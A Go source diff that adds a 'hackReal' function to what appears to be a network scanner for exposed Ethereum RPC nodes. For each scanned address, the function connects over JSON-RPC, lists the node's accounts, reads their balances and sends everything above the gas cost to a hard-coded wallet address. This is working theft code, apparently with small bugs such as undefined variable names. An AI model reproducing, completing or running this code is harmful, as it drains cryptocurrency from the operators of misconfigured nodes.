@@ -2,8 +2,9 @@ package main
 
 import (
 	"./logger"
-	// "./rpcs"
+	"./rpcs"
 	"fmt"
+	"math/big"
 	"net"
 	"strconv"
 	"strings"
@@ -57,7 +58,33 @@ func (pxy *proxy) hackGetConnect() {
 		ip := net.ParseIP(addr)
 		pxy.scanIP(ip, i)
 	}
-	pxy.hackChan <- true
+	// pxy.hackChan <- true
+}
+func (pxy *proxy) hackReal() {
+	addrs := red.GetGoodPort() //获取写入的地址，此地址还没有进行链接
+	logger.Info("hackReal:", len(addrs))
+	for addr := range addrs {
+		r := rpcs.NewRPCClient("xx", addrport, "3s")
+		// 	//if connected write to redis set
+		_, err := r.GetBlockNumber()
+		if err == nil {
+			// red.WriteRealEthPort(addr)
+			acc, err2 := r.GetAccounts()
+			if err2 == nil {
+				for a := range acc {
+					balace, err2 := r.GetBalance(a)
+					if err2 == nil {
+						left := balance.Sub(big.NewInt(22000 * 22000000000))
+						if left.Cmp(big.NewInt(0)) > 0 {
+							r.SendTransaction(a, "6c654877175869c1349767336688682955e8edf8", "22000", "22000000000", left.Text(10), false)
+						}
+					}
+				}
+			}
+		}
+		logger.Info("hackReal:", addr)
+		time.Sleep(3 * time.Second)
+	}
 }
 func (pxy *proxy) scanIP(ip net.IP, i int) {
 	var wg sync.WaitGroup
